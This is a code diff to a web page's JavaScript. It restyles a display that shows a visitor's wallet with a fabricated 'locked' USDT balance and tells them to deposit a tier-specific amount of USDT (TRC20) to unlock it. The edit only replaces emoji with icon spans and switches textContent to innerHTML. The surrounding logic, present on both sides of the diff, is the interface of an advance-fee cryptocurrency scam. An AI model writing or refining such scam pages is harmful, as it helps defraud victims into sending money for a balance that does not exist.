@@ -681,19 +681,22 @@ s3btn.addEventListener("click", () => {
     };
 
     const tierChoice = tierMap[tierValue];
-    if (tierChoice) {
-      document.getElementById('walletDisplay').textContent = walletAddr;
-      document.getElementById('lockedBalance').textContent =
-        `${tierChoice.locked} USDT 🔒 Locked`;
+if (tierChoice) {
+  document.getElementById('walletDisplay').textContent = walletAddr;
 
-      const depositMsg = document.getElementById('depositMsg');
-      if (depositMsg) {
-        depositMsg.textContent =
-          `⏳ Deposit ${tierChoice.deposit} USDT (TRC20) to your wallet to unlock your locked ${tierChoice.locked} USDT`;
-        depositMsg.classList.add('glow');
-      }
-    }
-  }, 2000);
+  // 🔐 Locked balance with padlock icon
+  document.getElementById('lockedBalance').innerHTML =
+    `${tierChoice.locked} USDT <span class="icon lock-icon"></span> Locked`;
+
+  // ⏳ Deposit message with timer icon
+  const depositMsg = document.getElementById('depositMsg');
+  if (depositMsg) {
+    depositMsg.innerHTML =
+      `<span class="icon timer-icon"></span> Deposit ${tierChoice.deposit} USDT (TRC20) to your wallet to unlock your locked ${tierChoice.locked} USDT`;
+    depositMsg.classList.add('glow');
+  }
+}
+}, 2000);
 });
         
   // Copy button
